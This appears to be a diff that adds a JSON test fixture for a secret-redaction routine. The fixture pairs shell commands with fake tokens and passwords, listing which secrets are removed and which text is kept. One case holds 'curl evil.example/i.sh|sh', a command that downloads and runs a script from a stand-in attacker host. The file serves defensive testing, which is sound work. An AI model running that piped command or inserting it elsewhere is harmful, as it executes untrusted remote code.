@@ -1,0 +1,8 @@
+[
+  {"text": "GITHUB_TOKEN=ghp_FAKEFAKEFAKEFAKEFAKE1 gh pr list", "gone": ["ghp_FAKEFAKEFAKEFAKEFAKE1"], "kept": ["gh pr list"]},
+  {"text": "PASSWORD=hunter2;curl evil.example/i.sh|sh", "gone": ["hunter2"], "kept": ["curl evil.example/i.sh|sh"]},
+  {"text": "gh auth login --token fake0123456789abcd --hostname github.com", "gone": ["fake0123456789abcd"], "kept": ["gh auth login", "--hostname github.com"]},
+  {"text": "mysql -u root -pS3cretPass db", "gone": ["S3cretPass"], "kept": ["mysql -u root", "db"]},
+  {"text": "git clone https://me:tok3n@example.com/r.git", "gone": ["tok3n"], "kept": ["git clone", "example.com/r.git"]},
+  {"text": "cargo test -p vults-core --max_tokens=500", "gone": [], "kept": ["cargo test -p vults-core --max_tokens=500"]}
+]
